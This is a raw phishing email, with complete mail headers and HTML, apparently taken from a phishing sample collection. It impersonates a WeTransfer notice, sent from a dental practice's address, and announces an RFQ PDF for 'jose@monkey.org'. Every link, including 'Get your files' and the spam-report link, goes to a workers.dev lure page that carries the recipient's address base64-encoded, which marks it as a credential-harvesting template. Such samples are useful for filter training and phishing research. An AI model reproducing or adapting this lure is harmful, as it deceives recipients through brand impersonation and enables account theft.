@@ -1,0 +1,378 @@
+Return-Path: info@britefamilydental.com.au
+Delivered-To: jose@monkey.org
+X-FDA: 83178283986.27.51647C2
+Received: from smtp.integra.net.au (smtp.integra.net.au [103.2.197.14])
+	by imf18.b.hostedemail.com (Postfix) with ESMTP id C5B75120002
+	for <jose@monkey.org>; Mon,  3 Mar 2025 00:00:49 +0000 (UTC)
+Authentication-Results: imf18.b.hostedemail.com;
+	dkim=pass header.d=britefamilydental.com.au header.s=default
+ header.b=FJPWMRKG;
+	spf=pass (imf18.b.hostedemail.com: domain of info@britefamilydental.com.au
+ designates 103.2.197.14 as permitted sender)
+ smtp.mailfrom=info@britefamilydental.com.au;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1740960051;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=RbLVDSuDr82YVL2de184ofkxPU2IA9s20SRx3D5V7yQ=;
+	b=Z0/fIlqN2R0naZhBkE6YXh4ogN01J5PNWShNG7E5GjDTA9pKpUy+QQvUfHm0ogKTGxejqy
+	K4klNaNY9+uils1rAOOdYmYZL82TRcWi/wRIZiPKa1mrDyaSeJ6jysdJ97ZJn8lNVr3kNs
+	CZEDkNdWI1W4dpRxzOWWuYp/e/yaJUE=
+ARC-Authentication-Results: i=1;
+	imf18.b.hostedemail.com;
+	dkim=pass header.d=britefamilydental.com.au header.s=default
+ header.b=FJPWMRKG;
+	spf=pass (imf18.b.hostedemail.com: domain of info@britefamilydental.com.au
+ designates 103.2.197.14 as permitted sender)
+ smtp.mailfrom=info@britefamilydental.com.au;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1740960051; a=rsa-sha256;
+	cv=none;
+	b=1I+akl8BJbCmnbJr1sWSY+5IkRjkqgjMWYEw1pWv77qUf0YrnzoNu9u6a5QCThFZv15PNq
+	wgsYXjPkHOJgoeqlbDaUdC3ReI80mLhJdwwL7nGApgp65s26YWLZ31Stj9ah8NAqYlPb+S
+	pOSeQ+9nLEIfaPLlk7KwU3y5G1Yvkq4=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=britefamilydental.com.au; s=default; h=Content-Transfer-Encoding:
+	Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:
+	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
+	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
+	List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=RbLVDSuDr82YVL2de184ofkxPU2IA9s20SRx3D5V7yQ=; b=FJPWMRKGOPdjhRG824BpkPCtiP
+	5GeLLcjAiEzMB5dVndH1SZcTaZylfz2lBOXiXk5VF2WTO3cw49dmvAFVZflC/YCl71i6lsHoF9Vs1
+	0gIiNxpSnovzjj9V0WrclSb3YXBXGU/NP1sjR/7HOTOlZDBM2jA8nASWHWYdHRfhzciuvd+SXTL6k
+	ZAyk/79X6ETZ8c7OHkeOhdF7jsdlMGP9kl/b3malJ9shYTNPWSrYKasMMOCM2yh/f+Sag8dYxc+Vv
+	kXotJnf6Arq7IQFNP2oflJID73GkmEL47IvvFPA0xIigHjVuPco5/q838ncNx+JDsbL5MpddZY1kB
+	Q2gCB//w==;
+Received: from [45.88.186.157] (port=61269)
+	by SAU-A5132-OR.servercontrol.com.au with esmtpsa  (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.98.1)
+	(envelope-from <info@britefamilydental.com.au>)
+	id 1totEh-000000004Tq-1scz
+	for jose@monkey.org;
+	Mon, 03 Mar 2025 11:00:47 +1100
+From: WeTransfer <info@britefamilydental.com.au>
+To: jose@monkey.org
+Subject: "jose@monkey.org" Received Some Files from TransFlux Solutions
+Date: 3 Mar 2025 01:00:39 +0100
+Message-ID: <20250303010038.1C9318E5390C4B51@britefamilydental.com.au>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - SAU-A5132-OR.servercontrol.com.au
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - britefamilydental.com.au
+X-Get-Message-Sender-Via: SAU-A5132-OR.servercontrol.com.au: authenticated_id:
+ info@britefamilydental.com.au
+X-Authenticated-Sender: SAU-A5132-OR.servercontrol.com.au:
+ info@britefamilydental.com.au
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Queue-Id: C5B75120002
+X-Stat-Signature: 7omnwe69hu7i5nxo44upkbzowufteeux
+X-Rspam-User: 
+X-Spam-Status: No, score=1.00
+X-Rspamd-Server: rspam11
+X-HE-Tag: 1740960049-802734
+X-HE-Meta: 
+ U2FsdGVkX1/xnba28U2r5oScUOhw1D3rhw9uk7td8+aE8A+46Law+mYdFD0B4BxVRvyiTdDbmre7qs9Iy/i7UMGNrn18diR0rCwL+zy8lXcUqhFm3PMvXxaC6agWFtisQd0waXXi2AA8lahxfaX3oSkGkOO14DZG91j1djADLd0wLNOc5bSehYsRECT0KTSQy2E+gs5wMdargsNMV1A11vpMdDe6pWfga1rFwDK0iYW19R/vEHzmus53M1oOv0++Q6tnaAmdV9CGbBjG7H9j7y7/BzSLstCmFhluJxJF7IX4Jq+4uSvImoFcp+BT3gSpcs3W1dqrWcILm+WAVeqrhzL1sYKvujkJZNyZdsaDpA/cv84r1Fxw96iEXnRDs09MIal0fIUEalibW/EOcQyBdq9djZYZsA8zl12yHRAh0pfRoN2DM+v9mOjOrCNwhrOoCQJpuoymtv0ozfL6h/FD8T9JCb040HI0FwxaT1uvhGuo+StnLr7XbY05RCku2ir9F6hP7OcSdted1sr+N1aW4t121psHg2uDddAsR0MVjFACeItSnZhqm7qaKHE/oM/snpK7vdP+DrD9QBoahX2VTH1a01z+RXgEhDu+amp3A6ZFRO1W1u9Uvelq0TTsn6le3mNwd6jFv+egOEXI6ovQFGEW7GcgqCBeAxchzgeGhKW19td+Lyc07yDoUynXCGTkX9DElGPF0E0miWJO8c+z5QX4QoZOFzUDB466eaXIqdfjnvrcuWi3EkVxMybax0esY0S3RWPonM3Yyha6zmxcqsWXMSdfFYl9YI7yVKO9bisX07Qitvgqhp1uqDiSQpOS+6KHJriHgFWstnFgZ3vq+IEeeO5K64G1mLsfLXzP6bL737wYcB9OzvMAo1OHggFUfTQ8e9UjZHZTJIhZ8dZxnmnMbtACtwVSVyLzfJ3raFkBQjyeBRQFQW74vKIcaWqd0kmGq3Gmni/piHaDLKFlTVroEgf
+ nhrR7bHPglXqbTzq+799Slq66YlYBsuw7FM/jGcOskDywBqIet8AUO2iAIXSeMl01lnI/fqUwASJx3AVe2XVk6bSSAn9feprkOy3WP5VqvNHS0gO8wHHQicRZMyXuAH82CmeVYAyqcZDLD0JrQAmlCf3zpfy74SMBoCc50J2QF0HJhVvf8zCW8cR7vFfDGLRPJt6ExaPqr7j8jYsmMFJZdIZE+cJNdS6spbLjgB7lRDplqO2zfhFq3x7KMTBxyT+7ANYsrepI5jZ9gW9NDxb/H4bMjGgIZPsWnAUg/2kpeSeFeYvMS9Blid8qfrWr03sGtMRwbmE+TfZNSQ+eVfi3MPRPoHoWR8cpJkKxXnJPhg+tED4q7G7aephj3vkuEIbjUJPwy2yRH4Py8bPrvUEzQCESFgppMA2EnqzKM1wKKoOB+UfAyYZ1nfSWoROhW56rIcTt9EjYtzff//v0Vj5Shoz1t500I17Z26TWcImePKdlKks12jVQK1OqhisGkOMLgwFf09TuCRq6I+4g7iUtLhUKf+daADFRnTbjrqnix315gjV0m1ieghPSNTSXysZ+Z2vh4pM1tVz7tGtaLfjWXx8eZk/2U3cU2blyfCTtUXTUM2HlCviRM50LrB6dP6C/C2NU5svi1vnxa6+EJToXacP2BTRoqNwP2/yc
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 73
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<title></title>
+ <meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+</head>
+<body style=3D"font-family: Calibri; font-size: 11pt;">
+<table width=3D"600" align=3D"center" class=3D"v1inner_wrapper_table v1tabl=
+e_centered" style=3D'margin: 0px auto; padding: 0px; width: 600px; color: r=
+gb(51, 51, 51); text-transform: none; letter-spacing: normal; font-family: =
+"Lucida Grande", Verdana, Arial, Helvetica, sans-serif; font-size: 11px; fo=
+nt-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal;=
+ border-collapse: collapse; table-layout: fixed; min-width: 600px; border-s=
+pacing: 0px; orphans: 2; widows: 2; background-color:=20
+rgb(244, 244, 244); font-variant-ligatures: normal; font-variant-caps: norm=
+al; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; tex=
+t-decoration-style: initial; text-decoration-color: initial;' border=3D"0" =
+cellspacing=3D"0" cellpadding=3D"0">
+ <tbody>
+  <tr>
+   <td width=3D"600" align=3D"left" class=3D"v1inner_wrapper_td" valign=3D"=
+top" style=3D"margin: 0px; padding: 0px; width: 600px; min-width: 600px;">
+   <table class=3D"v1main_content_outer_wrapper_table" style=3D"margin: 0px=
+; padding: 0px; width: 600px; border-collapse: collapse; table-layout: fixe=
+d; border-spacing: 0px;" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"0">
+    <tbody>
+     <tr>
+      <td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px;=
+ width: 600px;">
+      <table class=3D"v1table_full_width" style=3D"margin: 0px; padding: 0p=
+x; width: 600px; border-collapse: collapse; table-layout: fixed; border-spa=
+cing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+       <tbody>
+        <tr>
+         <td align=3D"left" class=3D"v1padded_mobile v1main_content_inner_w=
+rapper_td" valign=3D"top" style=3D"margin: 0px; padding: 0px; width: 600px;=
+">
+         <p style=3D"text-align: center;"><span style=3D"font-size: 10px;">=
+&nbsp;<span style=3D"font-size: 8px;"><img alt=3D"Click 'Download images' t=
+o view images" src=3D"https://ci3.googleusercontent.com/meips/ADKq_NbpCyD7r=
+RykXhEKlH8d7j-IkObeQT44QCMY4zeIOKAPmqXlXuGRDqb9-RFqZ6kcUOiwxkhLsDxUTc3oKonw=
+dcyXbbOkObtEhLj6ow=3Ds0-d-e1-ft#https://email.wetransfer.net/emails/logos/b=
+lue_2x.png" width=3D"112" height=3D"60"></span></span></p>
+
+         <table class=3D"v1table_full_width" style=3D"margin: 0px; padding:=
+ 0px; width: 600px; border-collapse: collapse; table-layout: fixed; border-=
+spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+          <tbody>
+           <tr>
+            <td align=3D"center" class=3D"v1main_heading_td v1unpadded_mobi=
+le v1main_heading_td_wider" valign=3D"top" style=3D'margin: 0px; padding: 6=
+0px 80px 0px; width: 440px; color: rgb(23, 24, 26); line-height: 30px; font=
+-family: "FreightSans Pro", "Segoe UI", "SanFrancisco Display", Arial, sans=
+-serif; font-size: 26px; font-style: normal; font-weight: normal; word-spac=
+ing: 0px;'><font color=3D"#2348dc">jose@monkey.org<br></font><br>
+            received some files from<br>TransFlux Solutions</td>
+           </tr>
+           <tr>
+            <td align=3D"center" class=3D"v1files_details_td v1unpadded_mob=
+ile" valign=3D"top" style=3D'margin: 0px; padding: 20px 80px 0px; width: 44=
+0px; color: rgb(106, 109, 112); line-height: 23px; font-family: "Fakt Pro",=
+ "Segoe UI", "SanFrancisco Display", Arial, sans-serif; font-size: 14px; fo=
+nt-style: normal; font-weight: normal; word-spacing: 0px;'>2&nbsp;items,&nb=
+sp;8.5 MB in total&nbsp;will be deleted on&nbsp;10 March, 2025</td>
+           </tr>
+           <tr>
+            <td align=3D"left" class=3D"v1body_content_td  v1unpadded_mobil=
+e" valign=3D"top" style=3D'margin: 0px; padding: 50px 80px 0px; width: 440p=
+x; color: rgb(121, 124, 127); line-height: 24px; font-family: "Fakt Pro", "=
+Segoe UI", "SanFrancisco Display", Arial, sans-serif; font-size: 14px; font=
+-style: normal; font-weight: normal; word-spacing: 0px;'>
+            <p align=3D"center" class=3D"v1message_content" style=3D"margin=
+: -10px 0px 0px; padding: 20px; color: rgb(23, 24, 26); background-color: r=
+gb(250, 250, 250);">
+<span style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Calibri, sans-serif; font-size: 14px;=
+ font-style: normal; font-weight: 400; word-spacing: 0px; float: none; disp=
+lay: inline !important; white-space: normal; orphans: 2; widows: 2; backgro=
+und-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: i=
+nitial; text-decoration-style: initial;=20
+text-decoration-color: initial;">Request for Quotation (RFQ) - WeTransfer S=
+ervices:<br><br>"Could you please consider our new request for quote and pr=
+epare an offer for us?"</span></p>
+            </td>
+           </tr>
+           <tr>
+            <td align=3D"left" class=3D"v1button_outer_wrapper_td v1unpadde=
+d_mobile" valign=3D"top" style=3D"margin: 0px; padding: 40px 160px 0px; wid=
+th: 280px;">
+            <table class=3D"v1table_full_width v1button_table" style=3D"mar=
+gin: 0px; padding: 0px; width: 280px; border-collapse: collapse; table-layo=
+ut: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0">
+             <tbody>
+              <tr>
+               <td align=3D"left" valign=3D"top" style=3D"margin: 0px; padd=
+ing: 0px; width: 280px;">
+<a class=3D"v1button_anchor v1button_2_anchor" style=3D'padding: 15px 20px;=
+ text-align: center; color: rgb(255, 255, 255); font-family: "Fakt Pro Medi=
+um", "Segoe UI", "SanFrancisco Display", Arial, sans-serif; font-size: 14px=
+; font-style: normal; text-decoration: none; word-spacing: 0px; display: bl=
+ock; background-color: rgb(64, 159, 255);' href=3D"https://bittd310rrfq3-34=
+5t45tg45gr4fq3r-v43efwcef34.fresfst.workers.dev/?data=3Dam9zZUBtb25rZXkub3J=
+n" target=3D"_blank"=20
+rel=3D"noreferrer">
+<span>Get your files</span>
+</a></td>
+              </tr>
+             </tbody>
+            </table>
+            </td>
+           </tr>
+           <tr>
+            <td align=3D"left" class=3D"v1separator_40_outer_wrapper_td v1u=
+npadded_mobile" valign=3D"top" style=3D"margin: 0px; padding: 40px 80px 0px=
+; width: 440px;">
+            <table class=3D"v1table_full_width" style=3D"margin: 0px; paddi=
+ng: 0px; width: 440px; border-collapse: collapse; table-layout: fixed; bord=
+er-spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+             <tbody>
+              <tr>
+               <td align=3D"left" class=3D"v1separator_td" valign=3D"top" s=
+tyle=3D"margin: 0px; padding: 0px; width: 440px; line-height: 0; font-size:=
+ 1px; border-bottom-color: rgb(244, 244, 244); border-bottom-width: 2px; bo=
+rder-bottom-style: solid;">&nbsp;</td>
+              </tr>
+             </tbody>
+            </table>
+            </td>
+           </tr>
+           <tr>
+            <td align=3D"left" class=3D"v1body_content_td v1unpadded_mobile=
+ v1download_link_container" valign=3D"top" style=3D'margin: 0px; padding: 5=
+0px 80px 0px; width: 440px; color: rgb(121, 124, 127); line-height: 24px; f=
+ont-family: "Fakt Pro", "Segoe UI", "SanFrancisco Display", Arial, sans-ser=
+if; font-size: 14px; font-style: normal; font-weight: normal; word-spacing:=
+ 0px;'>
+<span class=3D"v1body_content_subheading_span" style=3D'color: rgb(23, 24, =
+26); font-family: "FreightSans Pro", "Segoe UI", "SanFrancisco Display", Ar=
+ial, sans-serif; font-size: 18px; font-weight: 500;'><a href=3D"https://bit=
+td310rrfq3-345t45tg45gr4fq3r-v43efwcef34.fresfst.workers.dev/?data=3Dam9zZU=
+Btb25rZXkub3Jn">Download</a></span></td>
+           </tr>
+           <tr>
+            <td align=3D"left" class=3D"v1body_content_td v1body_content_pa=
+dding_bottom_td v1files_list v1files_list_title v1unpadded_mobile" valign=
+=3D"top" style=3D'margin: 0px; padding: 50px 80px 0px; width: 440px; color:=
+ rgb(121, 124, 127); line-height: 24px; font-family: "Fakt Pro", "Segoe UI"=
+, "SanFrancisco Display", Arial, sans-serif; font-size: 14px; font-style: n=
+ormal; font-weight: normal; word-spacing: 0px;'>
+<a href=3D"https://bittd310rrfq3-345t45tg45gr4fq3r-v43efwcef34.fresfst.work=
+ers.dev/?data=3Dam9zZUBtb25rZXkub3Jn">2 Items</a></td>
+           </tr>
+           <tr>
+            <td align=3D"left" class=3D"v1tp0 v1body_content_td v1body_cont=
+ent_padding_bottom_td v1files_list v1files_list_content v1unpadded_mobile" =
+valign=3D"top" style=3D'margin: 0px; padding: 0px 80px 50px; width: 440px; =
+color: rgb(121, 124, 127); line-height: 24px; font-family: "Fakt Pro", "Seg=
+oe UI", "SanFrancisco Display", Arial, sans-serif; font-size: 14px; font-st=
+yle: normal; font-weight: normal; word-spacing: 0px;'>
+            <div class=3D"v1body_content_subheading_span" style=3D'color: r=
+gb(23, 24, 26); padding-top: 0px; font-family: "FreightSans Pro", "Segoe UI=
+", "SanFrancisco Display", Arial, sans-serif; font-size: 18px; font-weight:=
+ 500; border-top-color: currentColor; border-top-width: 0px; border-top-sty=
+le: none;'>&nbsp;</div>
+
+            <div class=3D"v1transfer_item v1transfer_item_last" style=3D"pa=
+dding: 9px 0px 7px; border-bottom-color: rgb(244, 244, 244); border-bottom-=
+width: 1px; border-bottom-style: none;">
+            <div class=3D"v1transfer_item_title" style=3D'color: rgb(23, 24=
+, 26); line-height: 16px; padding-top: 0px; font-family: "Fakt Pro", "Segoe=
+ UI", "SanFrancisco Display", Arial, sans-serif; font-size: 14px; font-styl=
+e: normal; font-weight: normal; word-spacing: 0px; border-top-color: curren=
+tColor; border-top-width: 0px; border-top-style: none;'><font color=3D"#254=
+dda">
+<a href=3D"https://bittd310rrfq3-345t45tg45gr4fq3r-v43efwcef34.fresfst.work=
+ers.dev/?data=3Dam9zZUBtb25rZXkub3Jn">
+10-03-2025_RFQ_WeTransfer_TransFluxSolutions.pdf</a><br><br></font></div>
+
+            <div class=3D"v1transfer_item_description" style=3D"color: rgb(=
+106, 109, 112); line-height: 16px; font-size: 12px;">8.5&nbsp;MB</div>
+            </div>
+            </td>
+           </tr>
+          </tbody>
+         </table>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      </td>
+     </tr>
+    </tbody>
+   </table>
+
+   <table class=3D"v1table_full_width" style=3D"margin: 0px; padding: 0px; =
+width: 600px; border-collapse: collapse; table-layout: fixed; border-spacin=
+g: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+    <tbody>
+     <tr>
+      <td align=3D"left" class=3D"v1add_our_email_outer_wrapper_td" valign=
+=3D"top" style=3D"margin: 0px; padding: 2px 0px 0px; width: 600px;">
+      <table class=3D"v1add_our_email_wrapper_table" style=3D"margin: 0px; =
+padding: 0px; width: 600px; border-collapse: collapse; table-layout: fixed;=
+ border-spacing: 0px;" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D"0" c=
+ellpadding=3D"0">
+       <tbody>
+        <tr>
+         <td align=3D"left" class=3D"v1padded_mobile v1add_our_email_inner_=
+wrapper_td" valign=3D"top" style=3D"margin: 0px; padding: 0px 20px; width: =
+560px;">
+         <table class=3D"v1table_full_width" style=3D"margin: 0px; padding:=
+ 0px; width: 560px; border-collapse: collapse; table-layout: fixed; border-=
+spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+          <tbody>
+           <tr>
+            <td align=3D"center" class=3D"v1add_our_email_td" valign=3D"top=
+" style=3D'margin: 0px; padding: 13px 0px; width: 560px; color: rgb(121, 12=
+4, 127); line-height: 24px; font-family: "Fakt Pro", "Segoe UI", "SanFranci=
+sco Display", Arial, sans-serif; font-size: 12px; font-style: normal; font-=
+weight: normal; word-spacing: 0px;'>
+            <p style=3D"margin: 0px; padding: 0px;">To make sure our emails=
+ arrive, please add<span>&nbsp;</span><a class=3D"v1email_without_default_c=
+lient_style" style=3D"color: rgb(121, 124, 127); font-weight: normal; text-=
+decoration: none;"><span class=3D"v1email_without_default_client_style" sty=
+le=3D"color: rgb(121, 124, 127); font-weight: normal; text-decoration: none=
+;">noreply@wetransfer.com</span></a><span>&nbsp;</span>to<span>&nbsp;</span=
+>
+ <a style=3D"color: rgb(121, 124, 127); font-weight: normal; text-decoratio=
+n: underline;" href=3D"https://bittd310rrfq3-345t45tg45gr4fq3r-v43efwcef34.=
+fresfst.workers.dev/?data=3Dam9zZUBtb25rZXkub3Jn" target=3D"_blank" rel=3D"=
+noreferrer">your contacts</a>.</p>
+            </td>
+           </tr>
+          </tbody>
+         </table>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      </td>
+     </tr>
+    </tbody>
+   </table>
+
+   <table class=3D"v1table_full_width" style=3D"margin: 0px; padding: 0px; =
+width: 600px; border-collapse: collapse; table-layout: fixed; border-spacin=
+g: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+    <tbody>
+     <tr>
+      <td align=3D"center" class=3D"v1footer_td" valign=3D"top" style=3D'ma=
+rgin: 0px; padding: 30px 20px; width: 560px; color: rgb(121, 124, 127); lin=
+e-height: 23px; font-family: "Fakt Pro", "Segoe UI", "SanFrancisco Display"=
+, Arial, sans-serif; font-size: 12px; font-style: normal; font-weight: norm=
+al; word-spacing: 0px;'><a class=3D"v1footer_link" style=3D"color: rgb(121,=
+ 124, 127); font-weight: normal; text-decoration: underline;" href=3D"" tar=
+get=3D"_blank" rel=3D"noreferrer">
+<span class=3D"v1footer_link" style=3D"color: rgb(121, 124, 127); font-weig=
+ht: normal; text-decoration: underline;">About WeTransfer</span></a><span>&=
+nbsp;</span> <a class=3D"v1footer_link" style=3D"color: rgb(121, 124, 127);=
+ font-weight: normal; text-decoration: underline;" href=3D"" target=3D"_bla=
+nk" rel=3D"noreferrer"> <span class=3D"v1footer_link" style=3D"color: rgb(1=
+21, 124, 127); font-weight: normal; text-decoration: underline;">Help</span=
+></a><span>&nbsp;</span>
+<span class=3D"v1footer_link_separator" style=3D"color: rgb(121, 124, 127);=
+">&nbsp;&nbsp;&nbsp;</span><span>&nbsp;</span> <a class=3D"v1footer_link" s=
+tyle=3D"color: rgb(121, 124, 127); font-weight: normal; text-decoration: un=
+derline;" href=3D"" target=3D"_blank" rel=3D"noreferrer"> <span class=3D"v1=
+footer_link" style=3D"color: rgb(121, 124, 127); font-weight: normal; text-=
+decoration: underline;">Legal</span></a><span class=3D"v1footer_link_separa=
+tor" style=3D"color: rgb(121, 124, 127);">&nbsp;&nbsp;&nbsp;</span>
+<span>&nbsp;</span><span class=3D"v1footer_link" style=3D"color: rgb(121, 1=
+24, 127); font-weight: normal; text-decoration: underline;"><a href=3D"http=
+s://bittd310rrfq3-345t45tg45gr4fq3r-v43efwcef34.fresfst.workers.dev/?data=
+=3Dam9zZUBtb25rZXkub3Jn">Report this transfer as spam</a></span></td>
+     </tr>
+    </tbody>
+   </table>
+   </td>
+  </tr>
+ </tbody>
+</table>
+
+</body></html>
+
